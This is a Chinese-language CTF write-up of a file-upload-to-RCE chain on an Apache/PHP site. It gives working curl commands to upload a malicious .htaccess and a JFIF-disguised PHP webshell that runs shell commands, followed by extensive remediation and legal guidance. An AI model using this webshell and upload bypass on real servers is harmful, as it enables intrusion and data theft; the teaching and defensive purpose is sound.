一、漏洞原理

目标是一个 Apache + PHP 的图片上传站点，开发者设了三道防线，但每一道都有缺陷，三个缺陷叠加形成完整 RCE 链。

#防线缺陷
① 扩展名黑名单
（php/phtml/phar…）		 漏了 .htaccess。pathinfo('.htaccess') 取后缀结果是空字符串 ""，不在黑名单内。
② MIME 白名单
（image/jpeg…）		 只读请求里的 Content-Type，完全由攻击者控制，伪造成 image/jpeg 即可。
③ Apache 解析机制 开启了 AllowOverride All，上传目录里的 .htaccess 能改解析规则，把 .jpg 当 PHP 执行。
核心利用链（背诵口诀）：
传 .htaccess 改解析 → 传图片马（图片头 + PHP 代码）→ 访问 jpg 触发 RCE → 读 flag

关键知识点

  • .htaccess 指令：AddType application/x-httpd-php .jpg，让当前目录下所有 .jpg 都交给 mod_php 解析。
  • 图片马：文件头是合法 JFIF 二进制（绕图片类型检测），后面拼 <?php ... ?> 代码。同一个文件，看是图片，执行是 webshell。
  • 黑名单 vs 白名单：黑名单总会漏（这里漏了 .htaccess），白名单才安全。
  • MIME 校验正确做法：用 finfo_file() / exif_imagetype() 读文件真实魔数，不信 $_FILES['type']。

二、攻击实现

全程 3 个 HTTP 请求，使用系统自带 curl 即可完成。先设环境变量：

B=http://目标IP:端口

Step 1上传 .htaccess 改解析规则

echo 'AddType application/x-httpd-php .jpg' > /tmp/ht
curl -s "$B/" -F "file=@/tmp/ht;filename=.htaccess;type=image/jpeg"

三个关键参数：

  • filename=.htaccess — 显式指定文件名（默认会用本地 basename "ht"）。
  • type=image/jpeg — 伪造 MIME 骗过白名单。
  • 文件后缀为空，黑名单匹配不到。
📷 截图：Step 1 终端 + 服务器返回 /uploads/.htaccess

Step 2上传图片马 shell.jpg

# JFIF 头（让 exif_imagetype 判为图片）
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > /tmp/shell.jpg
# 追加 PHP 一句话（必须单引号，防 bash 展开 $_GET）
printf '%s' '<?php echo "FLAG:".shell_exec($_GET["c"]); ?>' >> /tmp/shell.jpg
# 上传
curl -s "$B/" -F "file=@/tmp/shell.jpg;type=image/jpeg"
易错点：PHP 代码里有 $_GET，必须用单引号包裹，否则 bash 会把它当变量展开成空，写进文件的 PHP 就废了。
📷 截图：Step 2 上传响应返回 /uploads/shell.jpg

Step 3触发 RCE 读 flag

curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep FLAG

Apache 因 .htaccess 已经把 .jpg 交给 PHP 处理，?c= 参数被 shell_exec 执行。返回前半是 JFIF 二进制乱码，strings 过滤出可打印字符即可看到 flag。

📷 截图（关键得分点）：终端输出 FLAG: 行 + 完整 flag
✅ FLAG = TOGOGO-flag{xxxxxxxxxxxxxxxxxxxx}

三道门是如何被全部突破的

上传 .htaccess:  ext=""        黑名单不匹配 ✔   type=image/jpeg 白名单通过 ✔
上传 shell.jpg:  ext="jpg"     不在黑名单内 ✔   type=image/jpeg 白名单通过 ✔
触发执行:        .htaccess 已生效，.jpg 交给 mod_php，<?php ?> 被执行 ✔

三、防护措施（个人 / 管理 / 国家 三层面）

① 个人 / 开发者

  • 白名单代替黑名单：只允许 jpg/png/gif，其余一律拒绝。
  • 校验真实类型：用 finfo_file() 读文件魔数，不信 $_FILES['type']。
  • 重命名 + 随机化：uniqid().'.jpg'，杜绝 .htaccess、双扩展名。
  • 关闭上传目录脚本执行：php_admin_flag engine off。
  • 禁用 AllowOverride：根本上让 .htaccess 失效。
  • 存储到非 WebRoot：通过下载脚本输出，禁止直链访问。

② 企业 / 管理

  • SDL 安全开发生命周期：上传功能在设计阶段就强制威胁建模。
  • 统一文件服务：所有业务接入集中文件网关 + 对象存储，下线自研接口。
  • WAF 纵深防御：网关层拦截 .htaccess、.user.ini、双扩展名等高危文件名。
  • 权限最小化：上传目录挂载 noexec，Web 进程独立低权账户运行。
  • 日志告警：对 /uploads/ 下新出现的可执行文件触发实时告警。
  • 定期红蓝对抗：每年至少 1 次第三方渗透测试验证补丁有效性。

③ 国家 / 法律

  • 《网络安全法》（2017）：网络运营者必须履行安全保护义务，违者追责。
  • 《数据安全法》（2021）：数据分级分类管理，重大泄露可追刑责。
  • 《个人信息保护法》（2021）：最高可处营业额 5% 罚款。
  • 等保 2.0：三级以上系统必须满足边界完整性、入侵防范要求，文件上传是必查项。
  • CNVD / CNNVD 漏洞库：国家级漏洞收集与协调修复机制。
  • 护网行动：实战化攻防演练倒逼各单位真实加固。
三层协同：开发者写出正确代码 → 企业用 SDL 和 WAF 兜底 → 国家用立法和等保强制推动。任何单层都靠不住，纵深防御才是答案。

对本题的具体修复建议

  1. 把 .htaccess 和 .user.ini 加入黑名单，更彻底的做法是改白名单。
  2. 服务端用 finfo_file() 读文件真实 MIME。
  3. Apache 配置 AllowOverride None + 上传目录 php_admin_flag engine off。
  4. 上传后强制重命名（uniqid().'.jpg'），不保留原文件名。
